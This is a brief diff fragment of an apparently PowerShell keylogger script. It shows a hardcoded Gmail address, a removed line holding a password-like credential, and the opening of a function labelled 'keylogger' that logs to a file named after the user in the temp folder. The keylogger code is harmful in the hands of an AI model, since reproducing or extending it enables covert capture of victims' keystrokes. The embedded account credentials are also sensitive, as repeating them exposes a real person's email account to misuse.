@@ -3,7 +3,8 @@
 
 # gmail credentials
 $email = "soleimaniyounes24@gmail.com"
-$password = "ypotdmpnfxdxizek"
+$password = "
+"
 
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
